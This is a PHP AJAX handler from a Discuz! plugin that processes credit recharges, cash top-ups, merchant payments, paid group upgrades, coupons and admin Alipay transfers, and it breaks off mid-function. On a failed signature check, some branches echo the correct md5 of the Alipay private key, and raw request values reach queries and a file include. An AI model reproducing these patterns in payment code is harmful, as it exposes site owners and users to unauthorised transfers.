<?php
ob_start();
/**
 *	�����Ŷӣ�IT618
 *	it618_copyright �����ƣ�<a href="http://t.cn/Aiux1012" target="_blank" title="רҵDiscuz!Ӧ�ü��ܱ��ṩ��">DisM.Taobao.Com</a>
 */

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';

$uid = $_G['uid'];
$it618_pid=intval($_GET['it618_pid']);


if($_GET['ac']=="getwxappcode"){
	$tmpcode=str_replace(".","",$_GET['code']);
	$tmpcode=str_replace("/","",$tmpcode);
	$tmppath=DISCUZ_ROOT.'./source/plugin/it618_credits/pay_wx/wxappcode'.$tmpcode.'.php';

	if(file_exists($tmppath)){
		require_once $tmppath;
		echo $code;
		$result=unlink($tmppath);
		exit;
	}
	exit;
}


if($_GET['ac']=="transalipay"){
	if($_G['groupid']!=1)exit;
	
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php';
	}
	$transsign=md5($alipay_privatekey);
	if($_GET['transsign']!=$transsign){
		echo 'signerr';	
		exit;
	}
	
	$transdata=it618_credits_utftogbk($_GET['transdata']);
	$tmparr=explode("|",$transdata);
	
	$id = C::t('#it618_credits#it618_credits_trans')->insert(array(
		'it618_name' => $tmparr[0],
		'it618_money' => $tmparr[2],
		'it618_bz' => $tmparr[1].' '.$tmparr[3],
		'it618_statebz' => $it618_statebz,
		'it618_time' => $_G['timestamp']
	), true);
	
	if($tmparr[2]>$alipay_transmoney){
		C::t('#it618_credits#it618_credits_trans')->update($id,array(
			'it618_state' => 2,
			'it618_statebz' => $it618_credits_lang['s1292']
		));
		echo $it618_credits_lang['s1292'];
	}else{
		$out_biz_no = date("YmdHis").$id;
		$transstr=alitrans($out_biz_no,$tmparr[0],$tmparr[2],it618_credits_gbktoutf($tmparr[3]),it618_credits_gbktoutf($tmparr[1]));
		$transarr=explode("it618_split",$transstr);
		
		if($transarr[0]=='Success'){
			C::t('#it618_credits#it618_credits_trans')->update($id,array(
				'it618_state' => 1
			));
			echo 'Success';
		}else{
			C::t('#it618_credits#it618_credits_trans')->update($id,array(
				'it618_state' => 2,
				'it618_statebz' => $transarr[0]
			));
			echo $transarr[0];
		}
	}
}


if($_GET['ac']=="trans_get"){
	if($_G['groupid']!=1)exit;
	
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php';
	}
	$transsign=md5($alipay_privatekey);
	if($_GET['transsign']!=$transsign){
		echo $_GET['transsign'].'signerr'.$transsign;	
		exit;
	}
	
	if($_GET['state']>0){
		$it618sql='it618_state='.intval($_GET['state']);
	}
	
	$count = C::t('#it618_credits#it618_credits_trans')->count_by_search($it618sql,'',$_GET['name'],$_GET['bz'], $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_credits#it618_credits_trans')->sum_by_search($it618sql,'',$_GET['name'],$_GET['bz'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$ppp = 12;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$salesum= '<td colspan=15>'.it618_credits_getlang('s1287').'<font color=red>'.$count.'</font> '.it618_credits_getlang('s1288').'<font color=red>'.$summoney.'</font></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='gettranslist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='gettranslist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','gettranslist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	foreach(C::t('#it618_credits#it618_credits_trans')->fetch_all_by_search(
		$it618sql,'id desc',$_GET['name'],$_GET['bz'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_credits_trans) {
		if($it618_credits_trans['it618_state']==1){
			$it618_state='<font color=green>'.$it618_credits_lang['s1283'].'</font>';
		}else{
			$it618_state='<font color=red>'.$it618_credits_lang['s1284'].'</font><br><a href="javascript:" onclick="del('.$it618_credits_trans['id'].')">'.$it618_credits_lang['s1289'].'</a>';
		}
		
		$trans_get.='<tr class="hover">
		<td>'.$it618_credits_trans['it618_name'].'</td>
		<td>'.$it618_credits_trans['it618_money'].'</td>
		<td><div style="width:630px">'.$it618_credits_trans['it618_bz'].'<br><font color=red>'.$it618_credits_trans['it618_statebz'].'</font></div></td>
		<td>'.$it618_state.'</td>
		<td><div style="width:100px">'.date('Y-m-d H:i:s', $it618_credits_trans['it618_time']).'<div></td>
		</tr>';
	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	
	echo $salesum.'it618_split'.$trans_get.'it618_split'.$multipage;
}


if($_GET['ac']=="trans_del"){
	if($_G['groupid']!=1)exit;
	
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_credits/trans/config.php';
	}
	$transsign=md5($alipay_privatekey);
	if($_GET['transsign']!=$transsign){
		echo $_GET['transsign'].'signerr'.$transsign;	
		exit;
	}
	
	DB::delete('it618_credits_trans', "id=".intval($_GET['tid']));
}

if($_GET['formhash']!=FORMHASH)exit;


if($_GET['ac']=="payok"){
	if($_GET['ac1']=="moneypay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_credits_moneycztmp')." WHERE it618_state=1 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="skpay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_credits_moneysktmp')." WHERE it618_state=1 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="creditspay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_credits_sale')." WHERE it618_state=1 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="grouppay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_credits_buygroup_sale')." WHERE it618_state=1 and id=".intval($_GET['saleid']));
	}
	if($salecount>0){
		echo 'it618_splitok';exit;
	}
}


if($_GET['ac']=="moneypay_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits['credits_ismoneycz']==0){
			echo $it618_credits_lang['s1230'];exit;
		}
		
		$it618_money1=floatval($_GET['it618_money1']);
		if($it618_money1<0){
			echo $it618_credits_lang['s316'];exit;
		}
		
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$credits_moneyczgroup=(array)unserialize($it618_credits['credits_moneyczgroup']);
		if(!in_array($_G['groupid'], $credits_moneyczgroup)&&$credits_moneyczgroup[0]!=''){
			echo $it618_credits_lang['s538'];exit;
		}
		
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		if($_GET['paytype']==""){
			echo $it618_credits_lang['s271'];exit;
		}
		
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/moneyczset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/moneyczset.php';
		}
		
		if($money_zsbl>0){
			$zsjfcount=intval($money_zsbl*$it618_money1/100);
		}
		
		$yfmoney=$it618_money1;
		if($yfmoney<$money_count){
			echo $it618_credits_lang['s263'].$money_count.$it618_credits_lang['s264'];exit;
		}

		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_moneycztmp')->insert(array(
			'it618_uid' => $uid,
			'it618_money1' => $it618_money1,
			'it618_zsjfid' => $money_zsjfid,
			'it618_zsjfcount' => $zsjfcount,
			'it618_zsbl' => $money_zsbl,
			'it618_czyfmoney' => $yfmoney,
			'it618_state' => 0,
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"])
		), true);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;

		if($id>0){
			$saletype='0108';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_credits_lang['s1855'];
			$body=str_replace("{count}",$it618_money1.$it618_credits_lang['t25'],$body);
			
			$total_fee=$yfmoney;
			
			if(credits_is_mobile()){ 
				$wap=1;
				$url=$_G['siteurl'].it618_credits_getrewrite('credits_wap','moneysum','plugin.php?id=it618_credits:wap&dotype=moneysum');
				
				if(isset($_GET["cztype"])){
					$tmpurlarr=explode("_",$_GET["cztype"]);
					$pid=intval($tmpurlarr[1]);
					if($pid>0)$url=$_G['siteurl'].'plugin.php?id=it618_auction:wap&pagetype=product&cid='.$pid;
				}
			}else{
				$wap=0;
				$url=$_G['siteurl']."plugin.php?id=it618_credits:payok&saleid=".$saleid."&type=money";
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_credits',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);

			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;
		}
	}
	exit;
}


if($_GET['ac']=="pay_add"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		$creditsuid=intval($_GET['creditsuid']);
		$creditsindex=intval($_GET['creditsindex']);
		$creditscount=intval($_GET['creditscount']);
		if($creditscount<0){
			echo $it618_credits_lang['s316'];exit;
		}

		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		$tmpcount=DB::result_first("SELECT count(1) FROM ".DB::table('common_member')." WHERE uid=".$creditsuid);
		if($tmpcount==0){
			echo $it618_credits_lang['s259'];exit;
		}
		
		$credits_czgroup=(array)unserialize($it618_credits['credits_czgroup']);
		if(!in_array($_G['groupid'], $credits_czgroup)&&$credits_czgroup[0]!=''){
			echo $it618_credits_lang['s538'];exit;
		}
		
		$groupid=$_G['groupid'];
		
		$groupzk=DB::result_first("select it618_zk".$creditsindex." from ".DB::table('it618_credits_groupzk')." where it618_groupid=".$groupid);
		if($groupzk!=$_GET['groupzk']){
			echo 'it618_splitreloadit618_split'.$it618_credits_lang['s260'];exit;
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		if(!$it618_credits_recharge=C::t('#it618_credits#it618_credits_recharge')->fetch_by_isok_jfid($creditsindex)){
			echo 'it618_splitreloadit618_split'.$it618_credits_lang['s261'];exit;
		}else{
			
			$creditstitle=it618_credits_getcreditstitle($creditsindex);
			
			$rechargebl=$it618_credits_recharge['it618_rechargebl'];
			$moneycount=$it618_credits_recharge['it618_moneycount'];
			$zsbl=$it618_credits_recharge['it618_zsbl'];
			$zsjfid=$it618_credits_recharge['it618_zsjfid'];
			
			if($rechargebl!=$_GET['rechargebl']){
				echo 'it618_splitreloadit618_split'.$it618_credits_lang['s262'];exit;
			}
			
			$yfmoney=round($creditscount*$rechargebl*$groupzk/100,2);
			if($yfmoney<=0){
				echo $it618_credits_lang['s640'];exit;
			}
			if($yfmoney<$moneycount){
				echo $it618_credits_lang['s263'].$moneycount.$it618_credits_lang['s264'];exit;
			}
		}
		
		$it618_max=DB::result_first("select it618_max".$creditsindex." from ".DB::table('it618_credits_groupzk')." where it618_groupid=".$groupid);
		
		if($it618_max>0){
			$tomonth = date('n'); 
			$todate = date('j'); 
			$toyear = date('Y');
			$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
		
			$count=DB::result_first("select sum(it618_jfcount) from ".DB::table('it618_credits_sale')." where it618_saletype='recharge' and it618_state=1 and it618_time>=$time and it618_uid2=".$uid);
			
			if($count+$creditscount>$it618_max){
				$tmpstr=str_replace("{max}",$it618_max.$creditstitle,$it618_credits_lang['s1219']);
				$tmpstr=str_replace("{count}",$count.$creditstitle,$tmpstr);
				echo $tmpstr;exit;
			}
		}
		
		if($_GET['paytype']==""){
			echo $it618_credits_lang['s271'];exit;
		}
		
		if($zsbl>0){
			$zsjfcount=intval($zsbl*$creditscount/100);
		}
		
		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
			'it618_uid1' => $uid,
			'it618_uid2' => $creditsuid,
			'it618_jfid1' => $creditsindex,
			'it618_saletype' => 'recharge',
			'it618_jfcount' => $creditscount,
			'it618_zsjfid' => $zsjfid,
			'it618_zsjfcount' => $zsjfcount,
			'it618_zsbl' => $zsbl,
			'it618_bl' => $rechargebl,
			'it618_zk' => $groupzk,
			'it618_money' => $yfmoney,
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;

		if($id>0){
			$saletype='0101';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_credits_lang['s1854'];
			$body=str_replace("{count}",$creditscount.$creditstitle,$body);
			
			$total_fee=$yfmoney;
			
			if(credits_is_mobile()){ 
				$wap=1;
				$url=$_G['siteurl'].it618_credits_getrewrite('credits_wap','sum','plugin.php?id=it618_credits:wap&dotype=sum');
			}else{
				$wap=0;
				$url=$_G['siteurl']."plugin.php?id=it618_credits:payok&saleid=".$saleid."&type=sale";
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_credits',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);

			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;
		}
	}
	exit;
}


if($_GET['ac']=="skpay_add"){
	$uid=intval($_GET['it618_uid']);
	$it618_money=floatval($_GET['it618_money']);
	if($it618_money<0){
		echo $it618_credits_lang['s316'];exit;
	}
		
	if($uid<=0){
		echo $it618_credits_lang['s316'];
	}else{
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/skset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/skset.php';
		}
		
		if($sk_isok==0){
			echo $it618_credits_lang['s659'];exit;
		}
		
		$groupid=DB::result_first("select groupid from ".DB::table('common_member')." where uid=".$uid);
		$credits_skgroup=(array)unserialize($it618_credits['credits_skgroup']);
		if(!in_array($groupid, $credits_skgroup)&&$credits_skgroup[0]!=''){
			echo $it618_credits_lang['s660'];exit;
		}
		
		if($it618_credits_uset=C::t('#it618_credits#it618_credits_uset')->fetch_by_uid($uid)){
			$skrname=$it618_credits_uset['it618_skname'];
			$it618_url=$it618_credits_uset['it618_skurl'];
			if($it618_url==''){
				$it618_url=$sk_url;
			}
			if($it618_url==''){
				$it618_url=$_G['siteurl'];
			}
		}else{
			echo $it618_credits_lang['s662'];exit;
		}

		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if($_GET['paytype']==""){
			echo $it618_credits_lang['s271'];exit;
		}
		
		if($_GET['it618_zsutype']=='uid'){
			$tmpzsuid=$_GET['it618_zsustr'];
		}else if($_GET['it618_zsutype']=='cardid'){
			$tmpzsuid = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['it618_zsustr']);
		}else if($_GET['it618_zsutype']=='tel'){
			$tmpzsuid = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_tel($_GET['it618_zsustr']);
		}
		
		if($tmpzsuid!=''){
			$isshop=0;
			if(DB::result_first("select count(1) from ".DB::table('common_plugin')." where identifier='it618_brand'")>0){
				if($it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_uid($uid)){
					$ShopId=$it618_brand_brand['id'];
					$ShopName=$it618_brand_brand['it618_name'];
					$skrname=$it618_brand_brand['it618_name'];
					$it618_brand_brandgroup = C::t('#it618_brand#it618_brand_brandgroup')->fetch_by_id($it618_brand_brand['it618_power']);
					$Shop_score=$it618_brand_brandgroup['it618_score'];
					if($it618_brand_moneyset=C::t('#it618_brand#it618_brand_moneyset')->fetch_by_shopid_ok($ShopId)){
						if($it618_brand_brand['it618_state']==2&&$it618_brand_brand['it618_htstate']==1){
							$isshop=1;
						}
						
					}
				}
			}
			
			if($isshop==1){
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$tmpzsuid);
				if($username!=''){
					$userstr=it618_credits_getsmsstr($username,2).'**('.$tmpzsuid.')';
					$it618_brand = $_G['cache']['plugin']['it618_brand'];
					$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$uid);
					if($creditnum=="")$creditnum=0;
			
					if($creditnum<$Shop_score){
						echo it618_credits_lang('t329');exit;
					}
				}else{
					echo $it618_credits_lang['t327'];exit;
				}
			}else{
				echo $it618_credits_lang['t328'];exit;
			}
		}
		
		if($_GET['paytype']=='money'){
			$sk_zsbl=0;
			if($_G['uid']==$uid){
				echo $it618_credits_lang['s1079'];exit;
			}
		}
		
		$zsjfcount=intval($sk_zsbl*$it618_money/100);
		
		if($ii1i11i[9]!='d')exit;
		$id = C::t('#it618_credits#it618_credits_moneysktmp')->insert(array(
			'it618_uid' => $uid,
			'it618_money1' => $it618_money,
			'it618_zsjfid' => $sk_zsjfid,
			'it618_zsjfcount' => $zsjfcount,
			'it618_zsbl' => $sk_zsbl,
			'it618_tcbl' => $sk_tcbl,
			'it618_zsuid' => $tmpzsuid,
			'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		$time=$_G['timestamp']-3600*24;
		DB::query("delete from ".DB::table('it618_credits_moneysktmp')." where it618_state=0 and it618_time<$time");
		
		if($id>0){
			$saletype='0102';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_credits_lang['s663'];
			$body=str_replace("{name}",$skrname,$body);
			$body=str_replace("{money}",$it618_money,$body);
			$body=str_replace("{id}",$id,$body);
			
			$total_fee=$it618_money;
			$url=$it618_url;
			
			if(credits_is_mobile()){ 
				$wap=1;
			}else{
				$wap=0;
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_credits',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
			
			$time=$_G['timestamp']-3600*24;
			DB::query("delete from ".DB::table('it618_credits_salepay')." where it618_saletype='0102' and it618_state=0 and it618_time<$time");
			
			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype.'it618_split'.$saleid.'it618_split'.$userstr.'it618_split'.$url;
		}
	}
	exit;
}


if($_GET['ac']=="group_payadd"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		$credits_buygroup=(array)unserialize($it618_credits['credits_buygroup']);
		if(!in_array($_G['groupid'], $credits_buygroup)&&$credits_buygroup[0]!=''){
			echo $it618_credits_lang['s597'];exit;
		}
		
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/buygroupset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/buygroupset.php';
		}
		
		if($buygroup_isok==0){
			echo $it618_credits_lang['s590'];exit;
		}
		
		$buygroupid=intval($_GET['buygroupid']);
		$it618_days=intval($_GET['it618_days']);
		$isswitch=intval($_GET['isswitch']);
		$it618_unit=$_GET['it618_unit'];
		if($it618_days<0){
			echo $it618_credits_lang['s316'];exit;
		}
		
		if(DB::result_first("select count(1) from ".DB::table('it618_credits_buygroup')." where it618_isok=1 and id=".$buygroupid)==0){
			echo $it618_credits_lang['s243'];exit;
		}else{
			$it618_credits_buygroup=C::t('#it618_credits#it618_credits_buygroup')->fetch_by_id($buygroupid);
			$groupid=$it618_credits_buygroup['it618_groupid'];
			if(DB::result_first("select count(1) from ".DB::table('common_usergroup')." where groupid=".$groupid)==0){
				echo $it618_credits_lang['s243'];exit;
			}
		}
		
		if($it618_unit!=$it618_credits_buygroup['it618_unit']){
			echo $it618_credits_lang['s1024'];exit;
		}
		
		if($it618_credits_buygroup['it618_unit']==1)$it618_unitname=$it618_credits_lang['s1021'];
		if($it618_credits_buygroup['it618_unit']==2)$it618_unitname=$it618_credits_lang['s1022'];
		if($it618_credits_buygroup['it618_unit']==3)$it618_unitname=$it618_credits_lang['s1023'];
		
		if($it618_credits_buygroup['it618_unit']!=4){
			if($it618_days<$it618_credits_buygroup['it618_days1']){
				echo $it618_credits_lang['s607'].$it618_credits_buygroup['it618_days1'].$it618_unitname.$it618_credits_lang['s609'];exit;
			}
			
			if($it618_days>$it618_credits_buygroup['it618_days2']){
				echo $it618_credits_lang['s608'].$it618_credits_buygroup['it618_days2'].$it618_unitname.$it618_credits_lang['s609'];exit;
			}
		}
		
		$money=$it618_credits_buygroup['it618_price']*$it618_days;
		if($money<=0){
			echo $it618_credits_lang['s640'];exit;
		}
		
		if($_GET['paytype']==""){
			echo $it618_credits_lang['s271'];exit;
		}
		
		$id = C::t('#it618_credits#it618_credits_buygroup_sale')->insert(array(
			'it618_saletype' => 2,
			'it618_groupid' => $groupid,
			'it618_uid' => $uid,
			'it618_price' => $it618_credits_buygroup['it618_price'],
			'it618_days' => $it618_days,
			'it618_unit' => $it618_unit,
			'it618_isswitch' => $isswitch,
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		), true);
		
		if($id>0){
			$saletype='0103';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$groupid);
			$body=$it618_credits_lang['s1856'];
			$body=str_replace("{count}",$it618_days.$it618_unitname.$grouptitle,$body);
			
			$total_fee=$money;
			
			if(credits_is_mobile()){ 
				$wap=1;
				$url=$_G['siteurl'].it618_credits_getrewrite('credits_wap','buygroup','plugin.php?id=it618_credits:wap&dotype=buygroup');
			}else{
				$wap=0;
				$url=$_G['siteurl']."plugin.php?id=it618_credits:payok&saleid=".$saleid."&type=group";
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_credits',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
			
			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;
		}
	}
	exit;
}


if($_GET['ac']=="quan_add"){	
	if($it618_credits_quan = C::t('#it618_credits#it618_credits_quan')->fetch_by_it618_code($_GET['quancode'])){
		if($it618_credits_quan['it618_usetime']>0){
			echo $it618_credits_lang['s268'];
		}else{
			set_time_limit (0);
			ignore_user_abort(true);
			
			usleep(mt_rand(10,10000));
	
			$flagkm=0;$times=0;
			while($flagkm==0){
				if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
					$flagkm=1;
				}
				if($flagkm==0){
					sleep(1);
					$times=$times+1;
				}
				if($times>60){
					it618_credits_delmoneywork();
				}
			}
			C::t('#it618_credits#it618_credits_moneywork')->insert(array(
				'it618_iswork' => 1
			), true);
			
			if($it618_credits_quan['it618_etime']>0&&$it618_credits_quan['it618_etime']<$_G['timestamp']){
				echo $it618_credits_lang['s1861'];it618_credits_delmoneywork();exit;
			}
			
			if($it618_credits_quan['it618_xgtime']>0){
				$time=$_G['timestamp']-$it618_credits_quan['it618_xgtime']*3600*24;
				$buycount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_credits_quan')." where it618_usetime>$time and it618_useuid=".$uid);
				if($buycount>0){
					echo $it618_credits_lang['s887'].$it618_credits_quan['it618_xgtime'].$it618_credits_lang['s888'].$buycount.$it618_credits_lang['s889'];it618_credits_delmoneywork();exit;
				}
			}
			
			if($_GET['ac1']=="money"){
				$credits_moneyczgroup=(array)unserialize($it618_credits['credits_moneyczgroup']);
				if(!in_array($_G['groupid'], $credits_moneyczgroup)&&$credits_moneyczgroup[0]!=''){
					echo $it618_credits_lang['s538'];it618_credits_delmoneywork();exit;
				}
				
				if($it618_credits_quan['it618_jfid']!=0){
					echo $it618_credits_lang['s1204'];it618_credits_delmoneywork();exit;
				}
				
				savemoney(array(
					'it618_uid' => $uid,
					'it618_type' => 'cz',
					'it618_money1' => $it618_credits_quan['it618_money'],
					'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
					'it618_paytype' => 'quan',
					'it618_payid' => $_GET['quancode'],
					'it618_time' => $_G['timestamp']
				));
				
			}else{
				
				$creditsuid=intval($_GET['creditsuid']);
		
				$tmpcount=DB::result_first("SELECT count(1) FROM ".DB::table('common_member')." WHERE uid=".$creditsuid);
				if($tmpcount==0){
					echo $it618_credits_lang['s259'];it618_credits_delmoneywork();exit;
				}
			
				$credits_czgroup=(array)unserialize($it618_credits['credits_czgroup']);
				if(!in_array($_G['groupid'], $credits_czgroup)&&$credits_czgroup[0]!=''){
					echo $it618_credits_lang['s538'];it618_credits_delmoneywork();exit;
				}
				
				if($it618_credits_quan['it618_jfid']==0){
					echo $it618_credits_lang['s1205'];it618_credits_delmoneywork();exit;
				}
				
				if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
				$id = C::t('#it618_credits#it618_credits_sale')->insert(array(
					'it618_uid1' => $uid,
					'it618_uid2' => $creditsuid,
					'it618_jfid1' => $it618_credits_quan['it618_jfid'],
					'it618_saletype' => 'recharge',
					'it618_jfcount' => $it618_credits_quan['it618_jfcount'],
					'it618_money' => 0,
					'it618_paytype' => 'quan',
					'it618_payid' =>$_GET['quancode'],
					'it618_bz' => it618_credits_utftogbk($_GET["it618_bz"]),
					'it618_state' => 1,
					'it618_time' => $_G['timestamp']
				), true);
				
				if($it618_credits_quan['it618_jfid']<=8){
					C::t('common_member_count')->increase($creditsuid, array(
						'extcredits'.$it618_credits_quan['it618_jfid'] => $it618_credits_quan['it618_jfcount'])
					);
				}else{
					$creditstitle=it618_credits_getcreditstitle($it618_credits_quan['it618_jfid']);
					$body=$it618_credits_lang['s1254'];
					$body=str_replace("{count}",$it618_credits_quan['it618_jfcount'].$creditstitle,$body);
